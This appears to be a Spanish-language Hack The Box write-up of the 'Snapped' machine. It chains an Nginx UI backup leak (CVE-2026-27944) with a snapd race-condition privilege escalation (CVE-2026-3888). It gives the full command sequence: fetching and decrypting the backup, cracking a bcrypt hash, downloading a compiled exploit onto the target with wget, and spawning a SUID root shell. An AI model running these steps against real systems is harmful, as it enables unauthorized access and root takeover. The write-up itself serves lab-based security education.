<!--
  ════════════════════════════════════════════════════════════
  HTB SNAPPED (HARD) — WRITEUP
  CVE-2026-27944 + CVE-2026-3888
  ════════════════════════════════════════════════════════════
-->

<div align="center">
  <img src="snapped.png" alt="HTB Snapped Banner" width="100%" style="max-width: 960px; border-radius: 20px; margin: 20px 0;" />
  <br />
  <img src="https://img.shields.io/badge/HTB-Hard-red?style=for-the-badge&logo=hackthebox" alt="HTB Hard" />
  <img src="https://img.shields.io/badge/Linux-Ubuntu_24.04-orange?style=for-the-badge&logo=ubuntu" alt="Ubuntu 24.04" />
  <img src="https://img.shields.io/badge/CVE-2026--27944-blue?style=for-the-badge" alt="CVE-2026-27944" />
  <img src="https://img.shields.io/badge/CVE-2026--3888-purple?style=for-the-badge" alt="CVE-2026-3888" />
  <br />
  <img src="https://img.shields.io/badge/Status-Rooted-brightgreen?style=for-the-badge" alt="Rooted" />
  <img src="https://img.shields.io/badge/Date-July_2026-important?style=for-the-badge" alt="Date" />
</div>

---

## 📖 Resumen

**Snapped** es una máquina **Hard** de Hack The Box que encadena dos vulnerabilidades reales para obtener acceso inicial y escalar a root.

| Fase | Vulnerabilidad | Técnica |
|------|----------------|---------|
| **Foothold** | CVE-2026-27944 | Backup sin autenticación en Nginx UI → descifrado AES → hash bcrypt → SSH |
| **Privesc** | CVE-2026-3888 | Race condition TOCTOU en snapd → hijacking del linker dinámico → SUID root shell |

📌 **Lecciones clave**:
- Los endpoints de backup deben estar correctamente autenticados.
- Las claves de cifrado nunca deben exponerse en headers HTTP.
- Las race conditions en software de sistema son vectores críticos de escalada.

---

## 🎯 Foothold — CVE-2026-27944

### 1. Reconocimiento

```bash
nmap -sCV 10.129.70.42

Puerto	Servicio	Versión
22/tcp	SSH	OpenSSH 9.6p1 Ubuntu
80/tcp	HTTP	nginx 1.24.0 (Ubuntu)

Subdominio descubierto:
bash

ffuf -u http://10.129.70.42 -H 'Host: FUZZ.snapped.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

bash

admin                   [Status: 200, Size: 1407]

2. Explotación de CVE-2026-27944

El endpoint /api/backup devuelve un backup completo y filtra la clave AES en el header X-Backup-Security.
bash

curl -v http://admin.snapped.htb/api/backup -o backup.zip 2>&1 \
  | grep -i "X-Backup-Security"

http

X-Backup-Security: KEY=<base64> IV=<base64>

Descifrado del backup:
bash

KEY_HEX=$(echo "$KEY" | base64 -d | xxd -p -c 256)
IV_HEX=$(echo "$IV" | base64 -d | xxd -p -c 256)

openssl enc -d -aes-256-cbc -K $KEY_HEX -iv $IV_HEX -nopad \
  -in nginx-ui.zip -out nginx-ui-decrypted.zip

unzip nginx-ui-decrypted.zip

Extracción del hash bcrypt:
bash

strings database.db | grep '\$2a\$'

bash

$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq

Cracking con hashcat:
bash

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --force

3. Acceso SSH
bash

ssh jonathan@snapped.htb

bash

$ cat ~/user.txt

🚀 Escalada de Privilegios — CVE-2026-3888
1. Compilación del exploit
bash

cd ~/Escritorio/htb1/aiCyber
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE.git
cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE

gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c

2. Transferencia al target
bash

# Máquina atacante
python3 -m http.server 8080

bash

# Target
wget http://10.10.15.237:8080/exploit -O ~/exploit
wget http://10.10.15.237:8080/librootshell.so -O ~/librootshell.so
chmod +x ~/exploit ~/librootshell.so

3. Ejecución del exploit

Se sincroniza con systemd-tmpfiles-clean.timer para ganar la race condition.
bash

~/exploit ~/librootshell.so -d

Output esperado:
text

[+] Inner shell PID: 14715
[+] .snap already gone!
[!] TRIGGER — swapping directories...
[+] SWAP DONE — race won!
[+] Poisoned namespace PID: 14895
[+] Payload injected.
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)

4. Shell root
bash

/var/snap/firefox/common/bash -p

bash

# whoami
root
# cat /root/root.txt

🧰 Herramientas utilizadas
Herramienta	Propósito
nmap	Escaneo de puertos y servicios
ffuf	Descubrimiento de subdominios
curl / openssl	Descarga y descifrado del backup
sqlite3 / strings	Extracción de hashes
hashcat	Cracking de bcrypt
gcc	Compilación del exploit SUID
python3	Servidor HTTP para transferencia de archivos
📚 Referencias
CVE	Descripción	Enlace
CVE-2026-27944	Nginx UI Backup Disclosure	NVD
CVE-2026-3888	snapd TOCTOU LPE	NVD

Exploits:

    TheCyberGeek / CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE

    nomaisthere / CVE-2026-3888

Writeups:

    0xdf — HTB Snapped

    itssunshinexd — Medium

📂 Estructura del repositorio
text

snapped-writeup/
├── index.html          # Página web del writeup
├── snapped.png         # Banner para GitHub Pages
├── README.md           # Este archivo
└── assets/             # Recursos adicionales (opcional)

⚠️ Aviso legal

Este contenido es exclusivamente educativo. Todas las técnicas descritas se ejecutaron en un entorno autorizado (Hack The Box). No utilices estos conocimientos en sistemas sin autorización explícita.
